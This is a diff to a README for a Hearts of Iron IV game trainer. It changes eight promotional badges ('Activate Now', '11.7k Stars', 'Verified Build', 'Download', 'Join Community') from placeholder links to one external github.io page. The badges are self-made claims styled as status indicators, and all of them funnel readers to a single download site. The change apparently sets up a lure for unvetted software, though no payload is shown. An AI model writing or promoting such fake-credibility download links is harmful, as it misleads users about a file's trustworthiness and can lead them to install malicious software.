@@ -23,10 +23,10 @@ This trainer is designed for **single-player customization**. Whether you want u
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 11.7k Stars](https://img.shields.io/badge/GitHub-11.7k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://hearts-of-iron-iv-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://hearts-of-iron-iv-trainer.github.io/.github/)
+[![⭐️ 11.7k Stars](https://img.shields.io/badge/GitHub-11.7k_Stars-green?logo=github\&style=for-the-badge)](https://hearts-of-iron-iv-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://hearts-of-iron-iv-trainer.github.io/.github/)
 
 ---
 
@@ -155,8 +155,8 @@ A: Yes, configs can be saved and hotkey-switched.
 
 The **Hearts of Iron IV Trainer** empowers players with **instant research, unlimited resources, and military boosts**. Whether rewriting WWII history or experimenting with alt-history scenarios, it gives you the freedom to play your way.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://hearts-of-iron-iv-trainer.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://hearts-of-iron-iv-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://hearts-of-iron-iv-trainer.github.io/.github/)
 
 ---
